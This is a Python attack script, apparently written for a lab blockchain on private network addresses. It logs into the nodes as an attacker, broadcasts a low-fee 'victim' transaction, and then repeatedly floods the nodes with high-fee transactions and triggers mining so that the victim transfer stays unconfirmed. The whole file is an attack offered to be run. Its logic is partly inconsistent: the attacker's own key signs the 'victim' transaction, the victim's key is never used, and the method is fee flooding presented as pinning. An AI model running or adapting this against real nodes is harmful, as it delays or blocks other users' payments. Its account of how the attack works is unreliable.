# transaction_pinning_attack.py

import requests
import time
import json
import hashlib
from decimal import Decimal
import logging
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Configure logging
logging.basicConfig(level=logging.INFO,  # Set to DEBUG for more detailed logs
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Configuration
KNOWN_NODES = [
    'http://172.16.83.23:5000',
    'http://172.16.83.23:5001',
    'http://172.16.83.23:5002'
    # Add more nodes as needed
]
ATTACKER_USERNAME = 'attacker'  # Ensure this user is registered in the blockchain
ATTACKER_PASSWORD = 'secure_password'  # Replace with the password used during registration
VICTIM_ADDRESS = 'victim'  # Ensure this user is registered in the blockchain
FEE_LOW = Decimal('0.0001')  # Very low fee to pin the victim's transaction
FEE_HIGH = Decimal('0.01')  # High fee for attacker transactions
AMOUNT_VICTIM = Decimal('1.0')  # Amount for victim's transaction
AMOUNT_ATTACKER = Decimal('0.5')  # Amount for attacker's transactions
SLEEP_INTERVAL = 10  # Seconds between attack iterations

# Paths and Passwords
ATTACKER_PRIVATE_KEY_PATH = 'attacker_private_key.pem'  # Update this path if different
VICTIM_PRIVATE_KEY_PATH = 'victim_private_key.pem'  # Update this path if different
PRIVATE_KEY_PASSWORD = None  # Replace with your password bytes if encrypted

# Function to calculate SHA-256 hash of transaction data
def calculate_hash(transaction_data):
    transaction_string = json.dumps(transaction_data, sort_keys=True).encode()
    return hashlib.sha256(transaction_string).hexdigest()

# Load Private Key
def load_private_key(pem_path, password=None):
    try:
        with open(pem_path, 'rb') as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=password,
            )
        logger.info(f"Private key loaded successfully from {pem_path}.")
        return private_key
    except Exception as e:
        logger.error(f"Failed to load private key from {pem_path}: {e}")
        return None

# Sign Transaction
def sign_transaction(private_key, transaction_data):
    try:
        signature = private_key.sign(
            json.dumps(transaction_data, sort_keys=True).encode(),
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return signature.hex()
    except Exception as e:
        logger.error(f"Failed to sign transaction: {e}")
        return None

# Login Function
def login(session, node, username, password):
    login_url = f"{node}/login"  # Adjust the endpoint as per your server
    payload = {
        'username': username,
        'password': password
    }
    try:
        response = session.post(login_url, data=payload, timeout=5)  # Use 'data' for form-encoded
        if response.status_code == 200:
            logger.info(f"Logged in successfully to {node} as '{username}'.")
            return True
        else:
            logger.error(f"Failed to login to {node}: {response.status_code} - {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        logger.error(f"Exception during login to {node}: {e}")
        return False

# Generate and Broadcast Transaction
def generate_and_broadcast_transaction(session, sender, receiver, amount, fee, private_key, node=None):
    transaction_data = {
        'sender': sender,
        'receiver': receiver,
        'amount': str(amount),
        'fee': str(fee),
        'timestamp': str(time.time())
    }
    signature = sign_transaction(private_key, transaction_data)
    if not signature:
        logger.error("Transaction signing failed.")
        return None

    # Calculate transaction ID as SHA-256 hash of transaction data
    transaction_id = calculate_hash(transaction_data)

    transaction = {
        'sender': sender,
        'receiver': receiver,
        'amount': str(amount),
        'fee': str(fee),
        'timestamp': transaction_data['timestamp'],
        'signature': signature,
        'transaction_id': transaction_id
    }

    # Broadcast the transaction to all known nodes or a specific node
    nodes_to_broadcast = [node] if node else KNOWN_NODES

    headers = {
        "Content-Type": "application/json"
        # If the server requires additional headers for transaction broadcasting, add them here
    }

    for target_node in nodes_to_broadcast:
        url = f"{target_node}/transactions/receive"
        try:
            response = session.post(url, json=transaction, headers=headers, timeout=5)
            if response.status_code == 200:
                logger.info(f"Broadcasted transaction {transaction_id} successfully to {target_node}.")
            else:
                logger.error(f"Failed to broadcast transaction {transaction_id} to {target_node}: HTTP {response.status_code} - {response.text}")
        except requests.exceptions.RequestException as e:
            logger.error(f"Exception during broadcasting transaction {transaction_id} to {target_node}: {e}")

    return transaction_id

# Mine Transactions
def mine_block(session, node):
    mine_url = f"{node}/mine"
    try:
        response = session.get(mine_url, timeout=10)
        if response.status_code == 200:
            logger.info(f"Successfully triggered mining on {node}.")
        else:
            logger.error(f"Failed to mine on {node}: HTTP {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Exception during mining on {node}: {e}")

# Monitor Transaction Status
def monitor_transaction(session, transaction_id):
    confirmed = True
    for node in KNOWN_NODES:
        pending_url = f"{node}/transactions/pending"
        try:
            response = session.get(pending_url, timeout=5)
            if response.status_code == 200:
                transactions = response.json().get('transactions', [])
                if any(tx['transaction_id'] == transaction_id for tx in transactions):
                    logger.info(f"Transaction {transaction_id} is still pending on {node}.")
                    confirmed = False
                else:
                    logger.info(f"Transaction {transaction_id} has been confirmed on {node}.")
            else:
                logger.error(f"Failed to fetch pending transactions from {node}: HTTP {response.status_code} - {response.text}")
        except requests.exceptions.RequestException as e:
            logger.error(f"Exception during fetching pending transactions from {node}: {e}")
    return confirmed

# Main Attack Execution Function
def execute_pinning_attack(session, attacker_private_key, victim_private_key):
    # Step 1: Create and broadcast the victim's low-fee transaction
    logger.info("Creating victim's low-fee transaction...")
    victim_tx_id = generate_and_broadcast_transaction(
        session=session,
        sender=ATTACKER_USERNAME,
        receiver=VICTIM_ADDRESS,  # Assuming self-spending for demonstration
        amount=AMOUNT_VICTIM,
        fee=FEE_LOW,
        private_key=attacker_private_key
    )
    if not victim_tx_id:
        logger.error("Failed to create victim's transaction. Aborting attack.")
        return
    time.sleep(SLEEP_INTERVAL)  # Wait for transaction to propagate
    # Step 2: Start the pinning loop
    iteration = 1
    while True:
        logger.info(f"--- Attack Iteration {iteration} ---")

        # Create and broadcast 5 high-fee attacker transactions
        for i in range(1, 6):
            attacker_tx_id = generate_and_broadcast_transaction(
                session=session,
                sender=ATTACKER_USERNAME,
                receiver=ATTACKER_USERNAME,  # Assuming self-spending for demonstration
                amount=AMOUNT_ATTACKER,
                fee=FEE_HIGH,
                private_key=attacker_private_key
            )
            if not attacker_tx_id:
                logger.error(f"Failed to create attacker transaction {i}.")
        time.sleep(SLEEP_INTERVAL)  # Wait before next iteration
        # Mine a block to include high-fee transactions
        logger.info("Triggering mining to include high-fee transactions...")
        # Choose a node to mine, e.g., the first node
        mine_block(session, KNOWN_NODES[0])

        # Monitor the victim's transaction
        logger.info(f"Monitoring victim's transaction {victim_tx_id} status...")
        confirmed = monitor_transaction(session, victim_tx_id)
        if confirmed:
            logger.info(f"Victim's transaction {victim_tx_id} has been confirmed. Attack failed.")
            break
        else:
            logger.info(f"Victim's transaction {victim_tx_id} is still pending. Continuing attack...")

        iteration += 1
        time.sleep(SLEEP_INTERVAL)  # Wait before next iteration

        # Optional: Limit the number of iterations to prevent infinite loop
        if iteration > 10:
            logger.info("Reached maximum attack iterations. Stopping attack.")
            break

def main():
    # Create a session to persist cookies
    session = requests.Session()

    # Load Private Keys
    attacker_private_key = load_private_key(ATTACKER_PRIVATE_KEY_PATH, password=PRIVATE_KEY_PASSWORD)
    if not attacker_private_key:
        logger.error("Attacker's private key not loaded. Exiting attack script.")
        return

    victim_private_key = load_private_key(VICTIM_PRIVATE_KEY_PATH, password=PRIVATE_KEY_PASSWORD)
    if not victim_private_key:
        logger.error("Victim's private key not loaded. Exiting attack script.")
        return

    # Login as attacker to establish session
    logger.info("Logging in as attacker...")
    login_success = False
    for node in KNOWN_NODES:
        if login(session, node, ATTACKER_USERNAME, ATTACKER_PASSWORD):
            login_success = True
            break
    if not login_success:
        logger.error("Failed to login to any node. Exiting attack script.")
        return

    logger.info("Starting Comprehensive Transaction Pinning Attack...")
    execute_pinning_attack(session, attacker_private_key, victim_private_key)
    logger.info("Transaction Pinning Attack Execution Complete.")

if __name__ == "__main__":
    main()
